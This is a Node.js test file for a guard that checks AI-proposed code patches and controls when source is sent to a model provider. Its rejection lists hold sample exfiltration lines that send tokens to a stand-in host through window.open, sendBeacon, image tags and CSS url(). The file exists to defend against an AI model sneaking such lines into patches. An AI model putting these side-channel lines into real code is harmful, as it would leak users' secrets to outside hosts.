import test from 'node:test';
import assert from 'node:assert/strict';
import { MODEL_ALLOWED_PATH, validateModelPatch, buildModelRequest, requestModelPatch } from '../aieo/lib/model-provider.mjs';

const source = 'function demo() {\n  const sample = 100;\n}\n';
const find = '  const sample = 100;';
const replacement = '  const sample = 101;';
const proposal = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'Correct a simple constant' });
const env = {
  AIEO_MODEL_ENABLED: 'true',
  AIEO_SOURCE_SHARING_APPROVED: 'true',
  GITHUB_EVENT_NAME: 'workflow_dispatch',
  GITHUB_REF: 'refs/heads/main',
  OPENROUTER_API_KEY: 'synthetic-key-not-real',
  OPENROUTER_MODEL_ID: 'provider/safe-model:free'
};
const task = 'Correct the sample constant in a bounded manner.';

test('scope and exact single replacement are enforced', () => {
  const result = validateModelPatch({ response: proposal, source });
  assert.equal(result.status, 'proposed');
  assert.equal(result.patchedSource, source.replace(find, replacement));
  assert.equal(validateModelPatch({ response: proposal, source: source + find }).status, 'rejected');
  assert.equal(validateModelPatch({ response: proposal, source, path: 'supabase/migrations/unsafe.sql' }).status, 'rejected');
});
test('untrusted or malformed model output fails closed', () => {
  for (const response of [
    'not JSON',
    'text: ' + proposal,
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'eval("bad")', explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'const x = process.env.SECRET;', explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'ghp_' + 'a'.repeat(30), explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: find, explanation: 'x' })
  ]) assert.equal(validateModelPatch({ response, source }).status, 'rejected');
});
test('no source disclosure without explicit consent and privacy scan', () => {
  assert.throws(() => buildModelRequest({ source, task, model: env.OPENROUTER_MODEL_ID, shareApproved: false }));
  assert.throws(() => buildModelRequest({ source: 'const api_key = "plaintext-secret";', task, model: env.OPENROUTER_MODEL_ID, shareApproved: true }));
  assert.throws(() => buildModelRequest({ source, task, model: env.OPENROUTER_MODEL_ID, shareApproved: true, path: '.env' }));
});
test('manual restrictions block all network calls on PR, missing secret, or missing consent', async () => {
  let calls = 0;
  const transport = () => { calls += 1; throw new Error('must not call'); };
  const variants = [
    { ...env, GITHUB_EVENT_NAME: 'pull_request' },
    { ...env, OPENROUTER_API_KEY: '' },
    { ...env, AIEO_SOURCE_SHARING_APPROVED: 'false' },
    { ...env, GITHUB_REF: 'refs/heads/feature' }
  ];
  for (const current of variants) assert.equal((await requestModelPatch({ source, task, env: current, transport })).status, 'blocked');
  assert.equal(calls, 0);
});
test('mock provider call sends bounded source and returns validated proposal only', async () => {
  let requests = 0;
  const transport = async (url, opts) => {
    requests += 1;
    assert.equal(url, 'https://openrouter.ai/api/v1/chat/completions');
    assert.equal(opts.method, 'POST');
    assert.equal(opts.headers.Authorization, 'Bearer synthetic-key-not-real');
    const body = JSON.parse(opts.body);
    assert.equal(body.model, env.OPENROUTER_MODEL_ID);
    assert.ok(body.messages[1].content.includes(source));
    assert.equal(JSON.stringify(body).includes(env.OPENROUTER_API_KEY), false);
    return { ok: true, text: async () => JSON.stringify({ choices: [{ message: { content: proposal } }] }) };
  };
  const result = await requestModelPatch({ source, task, env, transport });
  assert.equal(result.status, 'proposed');
  assert.equal(result.patchedSource, source.replace(find, replacement));
  assert.equal(requests, 1);
});
test('provider errors do not expose source or credentials', async () => {
  const failed = await requestModelPatch({ source, task, env, transport: async () => ({ ok: false }) });
  assert.deepEqual(failed, { status: 'failed', reason: 'Provider did not accept request' });
  const malformed = await requestModelPatch({ source, task, env, transport: async () => ({ ok: true, text: async () => 'garbage' }) });
  assert.equal(malformed.status, 'rejected');
});

test('model replacements cannot add browser side-channel transports', () => {
  for (const replacement of [
    'window.open("https://example.invalid/?data=" + token);',
    'navigator["sendBeacon"]("https://example.invalid", body);',
    'const pixel = new Image();',
    'location.assign("https://example.invalid");',
    'window.location.href = "https://example.invalid";',
    'document.createElement("iframe");',
    'globalThis["fetch"]("https://example.invalid");'
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal rejects markup and CSS side channels without fetch calls', () => {
  for (const replacement of [
    '<img src={\`https://example.invalid/?secret=\${token}\`} />',
    '<a href={unsafeUrl}>Open</a>',
    '<form action={target}>Send</form>',
    '<iframe\n src={unsafeUrl} />',
    'const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };',
    'const style = { background: \`url(https://example.invalid/\${token})\` };'
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('modern provider keys and bearer tokens are rejected before external source disclosure', async () => {
  const examples = [
    'sk-or-v1-' + 'a'.repeat(40),
    'github_pat_' + 'b'.repeat(42),
    'sk-proj-' + 'c'.repeat(42),
    'sb_secret_' + 'd'.repeat(36),
    'Bearer ' + 'e'.repeat(48)
  ];
  let sent = 0;
  const transport = async () => { sent += 1; throw new Error('source must not be sent'); };
  for (const marker of examples) {
    const unsafeSource = source + '\n// ' + marker;
    assert.throws(() => buildModelRequest({
      source: unsafeSource, task, model: env.OPENROUTER_MODEL_ID, shareApproved: true
    }));
    assert.throws(() => buildModelRequest({
      source, task: task + ' ' + marker, model: env.OPENROUTER_MODEL_ID, shareApproved: true
    }));
    assert.equal((await requestModelPatch({ source: unsafeSource, task, env, transport })).status, 'blocked');
    const unsafeProposal = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: '  const sample = "' + marker + '";',
      explanation: 'synthetic marker only'
    });
    assert.equal(validateModelPatch({ response: unsafeProposal, source }).status, 'rejected');
  }
  assert.equal(sent, 0, 'privacy rejection must happen before any HTTP attempt');
});
